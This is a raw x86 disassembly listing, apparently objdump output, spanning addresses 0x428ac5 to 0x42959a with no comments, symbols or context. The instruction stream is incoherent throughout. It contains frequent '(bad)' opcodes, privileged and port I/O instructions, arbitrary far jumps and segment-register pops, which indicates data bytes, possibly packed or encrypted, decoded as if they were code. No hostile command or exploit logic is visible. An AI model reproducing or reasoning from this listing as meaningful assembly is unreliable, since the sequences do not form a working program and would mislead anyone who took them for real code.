  428ac5:	mov    al,0x1
  428ac7:	add    dh,dh
  428ac9:	add    BYTE PTR [eax],al
  428acb:	add    BYTE PTR [ecx-0x27],dh
  428ace:	fwait
  428acf:	ins    DWORD PTR es:[edi],dx
  428ad0:	test   DWORD PTR [eax+0x67],edi
  428ad3:	pop    ds
  428ad4:	mov    DWORD PTR [esi+0x6a],ebp
  428ad7:	pusha  
  428ad8:	inc    ebx
  428ad9:	mul    BYTE PTR [eax]
  428adb:	sub    eax,0xf2d8a16d
  428ae0:	jb     0x428b2d
  428ae2:	sub    esi,DWORD PTR [edx+0x1d]
  428ae5:	into   
  428ae6:	mov    ecx,0x4e02d786
  428aeb:	test   DWORD PTR [ebp-0x4c],ecx
  428aee:	gs sbb eax,0x92a583ec
  428af4:	cld    
  428af5:	push   ecx
  428af6:	xchg   esi,eax
  428af7:	(bad)  cs:[ecx+0x39e82d70]
  428afe:	and    BYTE PTR [ebp-0x6ed81407],ah
  428b04:	(bad)  
  428b05:	gs adc al,0x8f
  428b08:	fs test esp,edx
  428b0b:	test   DWORD PTR [edi-0xb],0x6172404
  428b12:	lods   al,BYTE PTR ds:[esi]
  428b13:	sbb    al,0x45
  428b15:	push   ds
  428b16:	retf   0x8a90
  428b19:	jb     0x428aff
  428b1b:	and    DWORD PTR gs:[ecx+0x617e8e91],esi
  428b22:	mov    ch,0x98
  428b24:	adc    DWORD PTR [esi-0x39],esp
  428b27:	pop    esp
  428b28:	popa   
  428b29:	xor    al,0x62
  428b2b:	mov    cl,0x2
  428b2d:	adc    BYTE PTR [esi+0x4e64cd83],dl
  428b33:	add    esp,DWORD PTR ds:0x8c2f1a25
  428b39:	not    DWORD PTR [edx+0x1b]
  428b3c:	jno    0x428acd
  428b3e:	sbb    BYTE PTR es:[edx-0x79c4e441],bh
  428b45:	dec    edi
  428b46:	cmp    DWORD PTR [edx],ebp
  428b48:	adc    esp,edx
  428b4a:	int    0xd6
  428b4c:	jnp    0x428bb3
  428b4e:	mov    edx,0x71bd28f0
  428b53:	aaa    
  428b54:	loopne 0x428bc5
  428b56:	pop    ds
  428b57:	ja     0x428b17
  428b59:	pop    ecx
  428b5a:	mov    edi,0x55011a7b
  428b5f:	leave  
  428b60:	out    0x54,al
  428b62:	(bad)  
  428b64:	bound  eax,QWORD PTR [ebx-0x574006f8]
  428b6a:	cs push ss
  428b6c:	and    al,BYTE PTR [ebx]
  428b6e:	xchg   esi,eax
  428b6f:	pop    ss
  428b70:	pop    edi
  428b71:	rcr    BYTE PTR [esp+ebx*1+0x18cf6367],0x19
  428b79:	sbb    ah,BYTE PTR [ebx+0x7f256698]
  428b7f:	fs ja  0x428b6f
  428b82:	mov    ebx,0x4587ba1b
  428b87:	push   ax
  428b89:	ds mov dh,0x69
  428b8c:	es add al,0xab
  428b8f:	dec    esp
  428b90:	adc    esp,DWORD PTR [ecx]
  428b92:	mov    edi,0xe75e6dfb
  428b97:	leave  
  428b98:	and    eax,0xc6b57504
  428b9d:	sbb    dh,BYTE PTR [ebx-0x19cc1c84]
  428ba3:	or     BYTE PTR [ebx+0x27e34f8d],dh
  428ba9:	dec    ebx
  428baa:	pushf  
  428bab:	jmp    0x4bdf:0x1054540b
  428bb2:	or     DWORD PTR [eax-0x36666b72],ecx
  428bb8:	popa   
  428bb9:	dec    ebx
  428bba:	xchg   BYTE PTR [ecx+0x61],bh
  428bbd:	or     al,0x42
  428bbf:	jmp    0x428b45
  428bc1:	mov    al,0x0
	...
  428c33:	add    BYTE PTR [ebx-0xcbc4fb0],ah
  428c39:	jecxz  0x428c2e
  428c3b:	lock mov ebx,0xf3d7a28f
  428c41:	hlt    
  428c42:	or     eax,0x1b1445d
  428c47:	add    dh,dh
  428c49:	add    BYTE PTR [eax],al
  428c4b:	add    BYTE PTR [esi+0x7e74d1f1],bh
  428c51:	push   eax
  428c52:	sub    bl,BYTE PTR [ecx-0x68d8f781]
  428c58:	pop    ebx
  428c59:	adc    BYTE PTR [esi-0x44],bh
  428c5c:	lock and edx,DWORD PTR [ecx-0x1437d4f9]
  428c63:	cmp    DWORD PTR [ecx+0x5a36f301],edx
  428c69:	pop    ebp
  428c6a:	mov    esp,0x2003bf6e
  428c6f:	cs gs pop ds
  428c72:	loope  0x428c49
  428c74:	mov    eax,ds:0x818d7f48
  428c79:	jns    0x428cd7
  428c7b:	mov    al,0x9e
  428c7d:	mov    ds:0xbe0206,al
  428c82:	mov    edi,edx
  428c84:	pop    ebx
  428c85:	popa   
  428c86:	(bad)  
  428c87:	dec    ecx
  428c88:	xor    esi,DWORD PTR [ecx+0x64cbdd46]
  428c8e:	or     eax,0x2121aa12
  428c93:	mov    bl,BYTE PTR fs:[bx]
  428c97:	(bad)  
  428c98:	jle    0x428c27
  428c9a:	cmp    al,0xe3
  428c9c:	adc    eax,0x9882c3bc
  428ca1:	jb     0x428d1d
  428ca3:	shl    ebx,1
  428ca5:	pop    edi
  428ca6:	pusha  
  428ca7:	xor    eax,0x6d4b396b
  428cac:	xor    ah,ah
  428cae:	sub    al,0xdc
  428cb0:	retf   0x3fff
  428cb3:	and    BYTE PTR [esi],ah
  428cb5:	pushw  es
  428cb7:	(bad)  
  428cb8:	jmp    0x989d:0x3166a119
  428cbf:	jae    0x428c97
  428cc1:	sub    eax,0xd4570dda
  428cc6:	idiv   ah
  428cc8:	es push ecx
  428cca:	mov    esi,0x1d8113b2
  428ccf:	mov    cs,WORD PTR [edi]
  428cd1:	out    0xa2,al
  428cd3:	push   edi
  428cd4:	pusha  
  428cd5:	pop    ss
  428cd6:	or     al,0x92
  428cd8:	mov    eax,0xdebfd433
  428cdd:	into   
  428cde:	jb     0x428d11
  428ce0:	ja     0x428c95
  428ce2:	sti    
  428ce3:	push   edx
  428ce4:	ins    BYTE PTR es:[edi],dx
  428ce5:	jmp    0xe2e4:0x2ac69a63
  428cec:	pop    ss
  428ced:	sbb    al,0xcb
  428cef:	rol    DWORD PTR [esi],1
  428cf1:	sbb    DWORD PTR [edx+0x4affa058],ebx
  428cf7:	pop    ss
  428cf8:	mov    al,BYTE PTR [eax-0x2b]
  428cfb:	pop    edi
  428cfc:	pop    ds
  428cfd:	icebp  
  428cfe:	sub    bl,bh
  428d00:	pop    esp
  428d01:	sbb    esi,DWORD PTR [esi-0x4e]
  428d04:	out    dx,al
  428d05:	mov    cl,0x8d
  428d07:	mov    esi,0x11c4b00b
  428d0c:	int    0x75
  428d0e:	mov    dl,0xab
  428d10:	fwait
  428d11:	pop    esi
  428d12:	xlat   BYTE PTR ds:[ebx]
  428d13:	xor    eax,0x8b1af035
  428d18:	jmp    0x428d48
  428d1a:	pop    edi
  428d1b:	mov    ebx,0xeef0b290
  428d20:	dec    ebx
  428d21:	jl     0x428cb4
  428d23:	adc    DWORD PTR [ecx+ecx*1-0x2f8d2e9f],edx
  428d2a:	fisttp DWORD PTR [edi+0x57]
  428d2d:	aaa    
  428d2e:	push   0xffffff9f
  428d30:	stos   DWORD PTR es:[edi],eax
  428d31:	cmp    cl,BYTE PTR [ebx+0x1c]
  428d34:	loop   0x428d34
  428d36:	retf   
  428d37:	mov    ch,0x87
  428d39:	ja     0x428d31
  428d3b:	lods   eax,DWORD PTR ds:[esi]
  428d3c:	dec    esp
  428d3d:	pop    eax
  428d3e:	inc    eax
  428d3f:	sub    esi,DWORD PTR [esi+0x6a]
	...
  428db2:	add    BYTE PTR [eax],al
  428db4:	mov    eax,0x6d3c25f1
  428db9:	cld    
  428dba:	mov    ecx,0x195a21f5
  428dbf:	test   eax,0xb1a176d0
  428dc4:	cmp    dh,BYTE PTR [edx+0xf60001]
  428dca:	add    BYTE PTR [eax],al
  428dcc:	mov    dl,0x89
  428dce:	dec    esp
  428dcf:	popa   
  428dd0:	cmp    BYTE PTR [eax+0x5249561b],bl
  428dd6:	adc    DWORD PTR [esi+0x73],0xffffff80
  428dda:	aas    
  428ddb:	jbe    0x428d73
  428ddd:	inc    esi
  428dde:	outs   dx,BYTE PTR ds:[esi]
  428ddf:	sahf   
  428de0:	loopne 0x428e1c
  428de2:	mov    cl,0xcd
  428de4:	outs   dx,BYTE PTR ds:[esi]
  428de5:	hlt    
  428de6:	ss cs icebp 
  428de9:	xor    eax,0x6682947b
  428dee:	xor    ebp,esp
  428df0:	fst    st(1)
  428df2:	jge    0x428e61
  428df4:	repz out dx,eax
  428df6:	scas   eax,DWORD PTR es:[edi]
  428df7:	in     eax,dx
  428df8:	sbb    dh,ch
  428dfa:	int3   
  428dfb:	xor    edi,DWORD PTR ds:0x20a5c61c
  428e01:	ja     0x428e67
  428e03:	mov    ebx,0xd1ac1026
  428e08:	mov    ecx,0x7bdfe079
  428e0d:	dec    edi
  428e0e:	pushf  
  428e0f:	aam    0x23
  428e11:	sub    BYTE PTR [ebp+0x4a],cl
  428e14:	idiv   BYTE PTR [ebp+0x16]
  428e17:	data16 jno 0x428e40
  428e1a:	gs jb  0x428e87
  428e1d:	sub    DWORD PTR [edi-0xa],esp
  428e20:	loopne 0x428e14
  428e22:	es leave 
  428e24:	ds jl  0x428e27
  428e27:	(bad)  
  428e29:	xor    cl,BYTE PTR [edx-0x63d105fc]
  428e2f:	es mov ecx,esi
  428e32:	add    esp,DWORD PTR [edi-0x36]
  428e35:	pop    ds
  428e36:	cmp    dh,BYTE PTR [edi+eax*8+0x7de16a8f]
  428e3d:	aad    0xc7
  428e3f:	retf   0xfe96
  428e42:	add    ch,BYTE PTR [ebp+0x8]
  428e45:	push   esp
  428e46:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428e47:	pushf  
  428e48:	out    dx,eax
  428e49:	(bad)  
  428e4a:	adc    dh,BYTE PTR [edx]
  428e4c:	div    BYTE PTR [eax]
  428e4e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  428e4f:	and    edi,DWORD PTR cs:[eax-0x50]
  428e53:	test   BYTE PTR [edi],al
  428e55:	nop
  428e56:	cld    
  428e57:	or     DWORD PTR [edi],ecx
  428e59:	pop    DWORD PTR [esp+ebp*8]
  428e5c:	xchg   ecx,eax
  428e5d:	sbb    ebx,DWORD PTR [eax+0x5]
  428e60:	(bad)  
  428e62:	popf   
  428e63:	mov    DWORD PTR [ecx],edi
  428e65:	f2xm1  
  428e67:	mov    ebx,0x92f67a55
  428e6c:	xchg   esi,eax
  428e6d:	addr16 sti 
  428e6f:	cdq    
  428e70:	inc    eax
  428e71:	push   ds
  428e72:	jo     0x428ed9
  428e74:	sub    eax,0xc4347464
  428e79:	mov    dh,dh
  428e7b:	jmp    0x9819:0x11589cfd
  428e82:	dec    eax
  428e83:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  428e84:	dec    esp
  428e85:	das    
  428e86:	das    
  428e87:	iret   
  428e88:	add    ch,cl
  428e8a:	lea    ecx,[edi+0x1a]
  428e8d:	into   
  428e8e:	sti    
  428e8f:	out    0x84,eax
  428e91:	jbe    0x428ecb
  428e93:	out    0x72,eax
  428e95:	div    BYTE PTR [ebx+0x5634fd5e]
  428e9b:	xor    edx,DWORD PTR [ebx+0x46bcad2]
  428ea1:	or     DWORD PTR [edi+0x4b],eax
  428ea4:	pop    ebx
  428ea5:	and    DWORD PTR [edi-0x10],edx
  428ea8:	or     cl,al
  428eaa:	sbb    eax,0xcc7e7eb5
  428eaf:	sbb    esp,ecx
  428eb1:	dec    edi
  428eb2:	ins    BYTE PTR es:[edi],dx
  428eb3:	iret   
  428eb4:	std    
  428eb5:	test   BYTE PTR [ecx],ch
  428eb7:	out    0xc,eax
  428eb9:	aam    0xaa
  428ebb:	adc    BYTE PTR [ebx+0x4599b42b],dl
  428ec1:	popf   
	...
  428f32:	add    BYTE PTR [eax],al
  428f34:	mov    cl,0xa7
  428f36:	dec    ebx
  428f37:	das    
  428f38:	pop    edi
  428f39:	out    dx,eax
  428f3a:	cmc    
  428f3b:	mov    edi,0x37e5e17c
  428f40:	inc    esi
  428f41:	movs   DWORD PTR es:[edi],DWORD PTR gs:[esi]
  428f43:	pop    ds
  428f44:	xor    BYTE PTR [ebx+0xf60001],dh
  428f4a:	add    BYTE PTR [eax],al
  428f4c:	pop    ebx
  428f4d:	push   ds
  428f4e:	test   DWORD PTR [eax+ebp*1],esp
  428f51:	rol    DWORD PTR [ebp-0x690e6dd7],1
  428f57:	pop    ebp
  428f58:	lock lods eax,DWORD PTR ds:[esi]
  428f5a:	aam    0x7a
  428f5c:	popf   
  428f5d:	stos   DWORD PTR es:[edi],eax
  428f5e:	cmp    DWORD PTR [ebx-0x3a],esi
  428f61:	push   esi
  428f62:	push   ss
  428f63:	retf   0x753a
  428f66:	or     eax,0x10eba54f
  428f6b:	stos   BYTE PTR es:[edi],al
  428f6c:	push   ecx
  428f6d:	jp     0x428fca
  428f6f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  428f70:	fcomp  st(2)
  428f72:	mov    al,ds:0x9e34bd79
  428f77:	popa   
  428f78:	aam    0xac
  428f7a:	mov    edi,0x5ea61153
  428f7f:	cmp    eax,0xabc8c2d4
  428f84:	push   es
  428f85:	leave  
  428f86:	fld    QWORD PTR [ebx+0x3738d5ad]
  428f8c:	xchg   ebp,eax
  428f8d:	test   DWORD PTR [esi-0x7e],esi
  428f90:	mov    ah,0xf6
  428f92:	mov    ds:0xfbb5d732,eax
  428f97:	or     BYTE PTR [edx-0x75b864fc],bl
  428f9d:	popa   
  428f9e:	or     eax,0x341ca35
  428fa3:	shl    dl,0x23
  428fa6:	mov    ds:0x18b8777c,al
  428fab:	jecxz  0x428fe5
  428fad:	fimul  DWORD PTR [ecx-0x69]
  428fb0:	xchg   ecx,eax
  428fb1:	cmp    BYTE PTR [ebp*1-0x1a2db6da],ah
  428fb8:	cmp    al,0xd
  428fba:	lods   eax,DWORD PTR ds:[esi]
  428fbb:	imul   ebp,edi,0xffffffdc
  428fbe:	outs   dx,BYTE PTR ds:[esi]
  428fbf:	xchg   edx,eax
  428fc0:	push   esp
  428fc1:	push   eax
  428fc2:	xor    ebp,DWORD PTR [ebp+0x55]
  428fc5:	sub    al,0x73
  428fc7:	push   0x93009bc3
  428fcc:	fidiv  WORD PTR [edi]
  428fce:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  428fcf:	sahf   
  428fd0:	xor    cl,BYTE PTR [edi+0x34]
  428fd3:	fdiv   QWORD PTR [ecx]
  428fd5:	int3   
  428fd6:	in     al,0x58
  428fd8:	test   BYTE PTR [ecx-0x36],bl
  428fdb:	lods   eax,DWORD PTR ds:[esi]
  428fdc:	ss xchg ebp,eax
  428fde:	stos   DWORD PTR es:[edi],eax
  428fdf:	fild   WORD PTR [ebp+0x6fd338dc]
  428fe5:	fld    TBYTE PTR [ecx+0x7f]
  428fe8:	lods   al,BYTE PTR ds:[esi]
  428fe9:	adc    ah,BYTE PTR [eax]
  428feb:	outs   dx,DWORD PTR ds:[esi]
  428fec:	push   edi
  428fed:	adc    al,BYTE PTR [ecx+edx*2+0x30d2d51f]
  428ff4:	lock loope 0x428fe3
  428ff7:	sub    cl,BYTE PTR [edi]
  428ff9:	inc    esi
  428ffa:	xor    DWORD PTR [bx+si+0x4a],ebp
  428ffe:	in     eax,dx
  428fff:	test   al,0x37
  429001:	pop    ebp
  429002:	dec    ebx
  429003:	ja     0x42907e
  429005:	adc    DWORD PTR [eax-0x44],edi
  429008:	lea    edi,[edi+0x66]
  42900b:	or     BYTE PTR [eax],0x99
  42900e:	or     DWORD PTR [ecx+0x406fddfd],edx
  429014:	hlt    
  429015:	mov    ds:0x91f0aef8,al
  42901a:	js     0x428f9f
  42901c:	mov    eax,ds:0xf1fe6a9b
  429021:	xchg   esi,eax
  429022:	fwait
  429023:	scas   eax,DWORD PTR es:[edi]
  429024:	xor    eax,DWORD PTR [edi+0x10]
  429027:	mov    esi,0xe07ee653
  42902c:	lods   eax,DWORD PTR ds:[esi]
  42902d:	ss (bad) 
  42902f:	rcr    BYTE PTR [ecx],1
  429031:	add    DWORD PTR [ebx+0x70],esi
  429034:	shr    BYTE PTR [esi+0x8],cl
  429037:	dec    esi
  429038:	iret   
  429039:	and    DWORD PTR ds:0x986ebeac,esp
  42903f:	pop    ebp
  429040:	(bad)  
  429041:	xor    eax,0x0
	...
  4290b2:	add    BYTE PTR [eax],al
  4290b4:	fucomip st,st(6)
  4290b6:	std    
  4290b7:	dec    esp
  4290b8:	std    
  4290b9:	pop    edi
  4290ba:	(bad)  
  4290bb:	(bad)  
  4290bc:	mov    edi,0xd4b66cf7
  4290c1:	fucom  st(7)
  4290c3:	(bad)  
  4290c4:	es mov ah,0x1
  4290c7:	add    dh,dh
  4290c9:	add    BYTE PTR [eax],al
  4290cb:	add    dl,al
  4290cd:	xchg   esi,eax
  4290ce:	inc    edx
  4290cf:	test   esp,edi
  4290d1:	cmp    dl,BYTE PTR [edi]
  4290d3:	outs   dx,BYTE PTR ds:[esi]
  4290d4:	xor    DWORD PTR [ebx],0xe9da63de
  4290da:	lods   al,BYTE PTR ds:[esi]
  4290db:	pop    ds
  4290dc:	inc    esp
  4290dd:	cmp    al,0xf5
  4290df:	int    0x8e
  4290e1:	aaa    
  4290e2:	cmp    edi,0x19
  4290e5:	retf   
  4290e6:	sti    
  4290e7:	push   0xffffff85
  4290e9:	push   eax
  4290ea:	and    BYTE PTR [eax],cl
  4290ec:	gs jns 0x42914f
  4290ef:	pop    ebp
  4290f0:	jnp    0x4290bd
  4290f2:	int    0xc8
  4290f4:	inc    eax
  4290f5:	int    0xbc
  4290f7:	rcr    BYTE PTR [ebx-0x764324ba],1
  4290fd:	cld    
  4290fe:	shr    DWORD PTR [ebx],1
  429100:	sbb    eax,0x95d432d4
  429105:	mov    dl,0x7f
  429107:	pop    esi
  429108:	xor    eax,0xa604be4f
  42910d:	push   esp
  42910e:	test   DWORD PTR [edi],edx
  429110:	or     edx,0x37
  429113:	and    BYTE PTR [esp+ebx*1-0x68d31fd9],dh
  42911a:	sub    DWORD PTR [edx],edi
  42911c:	ret    0x18c1
  42911f:	xor    DWORD PTR [esi],edx
  429121:	pushf  
  429122:	int3   
  429123:	mov    dh,0x4
  429125:	cmp    eax,0xc6d71e23
  42912a:	dec    edi
  42912b:	jns    0x4290fc
  42912d:	push   edi
  42912e:	push   ds
  42912f:	(bad)  
  429130:	mov    bh,0xc3
  429132:	xor    DWORD PTR [edx+0x2f69927f],ebp
  429138:	rcr    eax,cl
  42913a:	pop    eax
  42913b:	dec    edi
  42913c:	sbb    DWORD PTR [esi+0x34],esi
  42913f:	icebp  
  429140:	cs pop esp
  429142:	bound  eax,QWORD PTR [ebx+0x31]
  429145:	mov    ah,0x5b
  429147:	js     0x429140
  429149:	(bad)  
  42914a:	fnsave [edx-0x9a6f3e9]
  429150:	js     0x4291b0
  429152:	cmp    al,0xb8
  429154:	jle    0x4291d1
  429156:	push   eax
  429157:	mov    esi,0xd8a18009
  42915c:	outs   dx,DWORD PTR ds:[esi]
  42915d:	(bad)  
  42915e:	and    eax,0x61d4ef40
  429163:	mov    dh,0x22
  429165:	mov    ecx,0x28e8d703
  42916a:	in     eax,dx
  42916b:	mov    ss,WORD PTR [edi-0x6741d32f]
  429171:	test   DWORD PTR [ebp-0xea0c258],ebx
  429177:	ret    0xabc0
  42917a:	pop    ebp
  42917b:	jecxz  0x42919f
  42917d:	fwait
  42917e:	xchg   BYTE PTR [ebp-0x23],bl
  429181:	or     eax,0xe88630fb
  429186:	xchg   esp,eax
  429187:	aad    0xe4
  429189:	addr16 jg 0x429198
  42918c:	fstp   QWORD PTR [edx]
  42918e:	xchg   edx,eax
  42918f:	and    eax,0x48f5466d
  429194:	(bad)  
  429195:	jecxz  0x42916b
  429197:	mov    ds:0x49dbf1a9,al
  42919c:	(bad)  
  42919d:	and    ah,BYTE PTR [ebx+0x26e7f887]
  4291a3:	sbb    DWORD PTR [edx],esp
  4291a5:	mov    ds:0xaf7dd5ec,eax
  4291aa:	mov    ebx,0x161eb3d1
  4291af:	(bad)  
  4291b0:	xchg   esp,eax
  4291b1:	sbb    DWORD PTR [esi-0x61],edi
  4291b4:	mov    edx,0xfee75f24
  4291b9:	ror    bh,1
  4291bb:	adc    BYTE PTR [ebp+0x46],bh
  4291be:	fwait
  4291bf:	sbb    al,0xd7
  4291c1:	add    BYTE PTR [eax],0x0
	...
  429234:	(bad)  
  429235:	fidiv  WORD PTR [esi]
  429237:	loop   0x429278
  429239:	jmp    0x67eb:0x13f5ffd7
  429240:	loope  0x42923d
  429242:	sbb    dh,ch
  429244:	sbb    al,0xb5
  429246:	add    DWORD PTR [eax],eax
  429248:	test   BYTE PTR [eax],0x0
  42924b:	add    BYTE PTR [edi-0x4b5e7890],al
  429251:	mov    es,WORD PTR ds:0xbeb7e2db
  429257:	xor    al,0x42
  429259:	inc    edi
  42925a:	sub    DWORD PTR [ebx+edi*1-0x39459b2],esp
  429261:	hlt    
  429262:	xchg   esp,eax
  429263:	pop    es
  429264:	test   BYTE PTR [eax-0x600d5e47],0xf7
  42926b:	and    eax,0x20b94409
  429270:	xor    DWORD PTR [esi+0x256b64ee],0x59
  429277:	retf   
  429278:	and    ah,ah
  42927a:	pop    edx
  42927b:	fistp  QWORD PTR [edi+0x3b837f88]
  429281:	adc    ah,0x93
  429284:	js     0x429286
  429286:	int    0xc
  429288:	mov    eax,ds:0xb5f2d4f7
  42928d:	ret    0xcf94
  429290:	(bad)  
  429291:	(bad)  
  429292:	and    ebx,esp
  429294:	sub    BYTE PTR [esi+0x63],bh
  429297:	fisttp WORD PTR [edi+esi*1-0x80]
  42929b:	lods   al,BYTE PTR ds:[esi]
  42929c:	or     al,0x93
  42929e:	(bad)  
  42929f:	out    dx,eax
  4292a0:	fcomp  DWORD PTR [eax-0x73]
  4292a3:	jae    0x42930c
  4292a5:	push   esp
  4292a6:	cmp    esp,DWORD PTR [esi]
  4292a8:	inc    esi
  4292a9:	pop    edi
  4292aa:	sub    esp,DWORD PTR [esi]
  4292ac:	jp     0x4292d9
  4292ae:	test   BYTE PTR [eax+edx*2+0x1b12e38b],dh
  4292b5:	jp     0x429261
  4292b7:	adc    eax,0x279b1a50
  4292bc:	mov    cl,0x49
  4292be:	push   edx
  4292bf:	popa   
  4292c0:	xchg   ecx,eax
  4292c1:	push   ss
  4292c2:	sbb    eax,ebx
  4292c4:	mov    edx,0x5d4912a1
  4292c9:	(bad)  
  4292ca:	push   edx
  4292cb:	cmc    
  4292cc:	iret   
  4292cd:	cdq    
  4292ce:	and    eax,0x3b0c117e
  4292d3:	mov    eax,0x439b3fc4
  4292d8:	popf   
  4292d9:	das    
  4292da:	mov    dh,0xa6
  4292dc:	and    BYTE PTR [edi-0x70f39546],dl
  4292e2:	stos   BYTE PTR es:[edi],al
  4292e3:	cmp    al,0xaf
  4292e5:	sahf   
  4292e6:	ins    BYTE PTR es:[edi],dx
  4292e7:	pop    esi
  4292e8:	add    esi,esi
  4292ea:	adc    BYTE PTR [esi+ebx*1+0x61e59a26],0x89
  4292f2:	mov    al,ds:0xe89a24cc
  4292f7:	jne    0x429324
  4292f9:	cmp    bl,BYTE PTR [ecx-0x29e78e77]
  4292ff:	in     eax,0xd5
  429301:	mov    edi,DWORD PTR [eax-0x44f4269a]
  429307:	and    DWORD PTR [ebx],edx
  429309:	out    dx,eax
  42930a:	daa    
  42930b:	jmp    0x429362
  42930d:	mov    al,ds:0xfc3501a1
  429312:	mov    DWORD PTR [ebp+ebp*2+0x722f6411],0x16b0af72
  42931d:	into   
  42931e:	jle    0x429341
  429320:	loope  0x429373
  429322:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  429323:	fild   WORD PTR [edi-0x22746269]
  429329:	sub    DWORD PTR [ebx+0x3e912378],0xcb8ed57
  429333:	(bad)
  429336:	jp     0x429352
  429338:	outs   dx,BYTE PTR ds:[esi]
  429339:	or     eax,0xefbdba42
  42933e:	mov    dh,ch
  429340:	lahf   
  429341:	jg     0x429343
	...
  4293b3:	add    BYTE PTR [esi],cl
  4293b5:	xchg   esp,eax
  4293b6:	jg     0x42941b
  4293b8:	(bad)  
  4293b9:	jmp    0x4293d9
  4293bb:	std    
  4293bc:	jge    0x4293da
  4293be:	in     al,dx
  4293bf:	xchg   edi,eax
  4293c0:	lods   al,BYTE PTR ds:[esi]
  4293c1:	(bad)  
  4293c3:	dec    ebx
  4293c4:	adc    dh,BYTE PTR [esi+0xf60001]
  4293ca:	add    BYTE PTR [eax],al
  4293cc:	xlat   BYTE PTR ds:[ebx]
  4293cd:	imul   esi,esi,0x11dc306a
  4293d3:	push   ss
  4293d4:	xor    DWORD PTR ds:0x9375d677,eax
  4293da:	mov    ah,0xf8
  4293dc:	cmp    ch,BYTE PTR ds:0x9fe9c235
  4293e2:	ins    DWORD PTR es:[edi],dx
  4293e3:	mov    dh,0xc6
  4293e5:	xor    ah,dl
  4293e7:	pop    edx
  4293e8:	dec    ecx
  4293e9:	inc    edi
  4293ea:	daa    
  4293eb:	sbb    BYTE PTR [ebx],cl
  4293ed:	mov    ah,0xf2
  4293ef:	sbb    ebp,DWORD PTR [edi+0x59]
  4293f2:	mov    bl,BYTE PTR [edx]
  4293f4:	or     al,BYTE PTR [ebp-0x49034a7]
  4293fa:	mov    ds:0x362d13ee,eax
  4293ff:	loopne 0x42945b
  429401:	push   esp
  429402:	adc    BYTE PTR [ebx+ebp*1],bh
  429405:	aam    0x8c
  429407:	fstp   TBYTE PTR [esi+0x2a854ef0]
  42940d:	jge    0x429450
  42940f:	push   ss
  429410:	pop    es
  429411:	push   ebp
  429412:	repnz cmp cl,BYTE PTR [ecx]
  429415:	sbb    BYTE PTR ds:0x9bb050df,dh
  42941b:	mov    dl,0x12
  42941d:	ins    DWORD PTR es:[edi],dx
  42941e:	ret    
  42941f:	and    eax,edx
  429421:	cmp    eax,0x8d16751b
  429426:	dec    ebp
  429427:	in     al,0xfa
  429429:	dec    esi
  42942a:	cdq    
  42942b:	ds jmp 0xc7937a89
  429431:	shr    cl,1
  429433:	adc    eax,0xabdd912b
  429438:	sar    DWORD PTR [edi-0x44d84244],cl
  42943e:	scas   eax,DWORD PTR es:[edi]
  42943f:	out    dx,eax
  429440:	jle    0x4294b0
  429442:	retf   0xcf99
  429445:	repnz in eax,dx
  429447:	cmp    edx,DWORD PTR [ecx+eiz*1+0x448e42be]
  42944e:	mov    bh,0x24
  429450:	mov    eax,ds:0x36567845
  429455:	dec    BYTE PTR [edx-0x32]
  429458:	and    al,0x60
  42945a:	jnp    0x42940b
  42945c:	add    al,0x63
  42945e:	or     cl,ah
  429460:	ds push 0x3a
  429463:	test   al,0xee
  429465:	inc    ebp
  429466:	push   esp
  429467:	pop    ecx
  429468:	mov    esp,0x5ac6675d
  42946d:	retf   
  42946e:	add    al,0x5
  429470:	mov    DWORD PTR [edx+ebp*2-0x48],eax
  429474:	in     al,dx
  429475:	shl    esi,0x30
  429478:	stos   DWORD PTR es:[edi],eax
  429479:	xor    DWORD PTR [eax-0x2a],esp
  42947c:	push   ss
  42947d:	ds add al,0x20
  429480:	ss adc eax,0xf000dc25
  429486:	mov    ebx,DWORD PTR [ecx+0x6f]
  429489:	fdivr  DWORD PTR [edi+ebx*8+0xf]
  42948d:	mov    dl,0x10
  42948f:	ins    BYTE PTR es:[edi],dx
  429490:	test   edi,0xfe422a0c
  429496:	xchg   edx,eax
  429497:	fs sub al,0x47
  42949a:	and    cl,BYTE PTR [eax+ecx*4+0x32]
  42949e:	pop    ebp
  42949f:	dec    edx
  4294a0:	int    0x93
  4294a2:	scas   al,BYTE PTR es:[edi]
  4294a3:	test   ebx,eax
  4294a5:	into   
  4294a6:	push   0xffffff91
  4294a8:	inc    edx
  4294a9:	jo     0x42950f
  4294ab:	shr    edx,cl
  4294ad:	and    dh,0xf4
  4294b0:	outs   dx,BYTE PTR ds:[esi]
  4294b1:	loopne 0x4294b5
  4294b3:	into   
  4294b4:	loopne 0x4294f4
  4294b6:	repnz int 0xa0
  4294b9:	sub    ebp,eax
  4294bb:	iret   
  4294bc:	shl    dl,cl
  4294be:	xor    eax,0x9d4337
	...
  429533:	add    BYTE PTR [ecx-0xa],dl
  429536:	xor    eax,0x5bffb73e
  42953b:	(bad)  
  42953c:	std    
  42953d:	cmp    eax,0xe64ec4f3
  429542:	dec    edi
  429543:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  429544:	or     BYTE PTR [edi+0xf60001],dh
  42954a:	add    BYTE PTR [eax],al
  42954c:	sub    edx,DWORD PTR ds:0x2f2369d3
  429552:	mov    ch,0x9
  429554:	dec    edi
  429555:	fst    QWORD PTR [ebx]
  429557:	add    al,0xb4
  429559:	bound  ebp,QWORD PTR [ebx]
  42955b:	cmp    eax,DWORD PTR [edx+0x62]
  42955e:	inc    ebp
  42955f:	push   esi
  429560:	sub    dl,BYTE PTR [esi-0x69]
  429563:	pop    ebx
  429564:	pop    edx
  429565:	inc    eax
  429566:	fist   DWORD PTR [edx-0x5e]
  429569:	mov    ds:0xf5cca2fa,ax
  42956f:	ret    0x5471
  429572:	call   0xfa04:0x861eeeb0
  429579:	pusha  
  42957a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42957b:	pop    eax
  42957c:	jle    0x4295df
  42957e:	sbb    esp,edx
  429580:	xchg   ecx,eax
  429581:	lods   eax,DWORD PTR ds:[esi]
  429582:	sub    BYTE PTR [edx+0xd],0xe0
  429586:	or     ch,cl
  429588:	adc    edi,esi
  42958a:	sub    edx,DWORD PTR [edi]
  42958c:	mov    ebx,esi
  42958e:	add    DWORD PTR [eax],0x34
  429591:	(bad)  
  429593:	frstor [edi-0x7f78c864]
  429599:	in     eax,dx
  42959a:	repnz mov ecx,esp
